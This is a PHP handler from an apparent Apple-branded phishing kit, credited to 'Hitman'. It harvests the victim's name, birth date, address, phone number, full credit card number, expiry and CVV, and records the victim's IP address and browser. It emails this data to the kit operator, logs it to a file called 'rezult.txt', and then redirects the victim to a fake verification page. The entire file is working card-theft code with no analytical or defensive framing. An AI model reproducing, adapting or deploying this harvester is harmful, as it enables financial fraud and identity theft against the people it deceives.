<?php
include "../to.php";
$Name  = $_POST['Name'];
$Month   = $_POST['Month'];
$Day   = $_POST['Day'];
$Year   = $_POST['Year'];
$Address = $_POST['Address'];
$City    = $_POST['City'];
$ZipCode = $_POST['ZipCode'];
$PhoneNumber = $_POST['PhoneNumber'];
$Country = $_POST['Country'];
$card_number= $_POST['card_number'];
$Month_   = $_POST['Month_'];
$Year_   = $_POST['Year_'];
$CVV     = $_POST['CVV'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Apple-2 -------------
Name : $Name
Month : $Month / Day : $Day / Year : $Year
Address : $Address
City : $City
ZipCode : $ZipCode
PhoneNumber : $PhoneNumber
Country : $Country
--- Credit Card Info ---
card_number : $card_number
Month_ : $Month_ / Year_ : $Year_
CVV : $CVV
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
$MAIL_TITLE = "Credit Card | ".$IP."";
$MAIL_HEADER = "From: Apple.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("../rezult.txt", "a");
fwrite($handle,$BILSMG);

$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=../verification.php'>";exit;

?>
